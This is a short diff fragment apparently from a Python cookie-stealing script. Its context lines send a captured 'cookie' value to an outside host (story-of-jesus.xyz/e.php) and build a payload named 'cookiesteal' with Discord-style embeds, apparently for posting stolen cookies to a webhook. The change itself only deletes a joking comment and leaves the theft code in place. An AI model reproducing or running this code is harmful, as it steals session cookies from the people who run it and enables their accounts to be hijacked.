@@ -215,7 +215,6 @@ try:
    r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
 except:cookies = "Cookie Not Found"
 pass
-# bruh you add {cookies} in the desc im way too lazy
 cookiesteal = {
             "embeds": [
               {
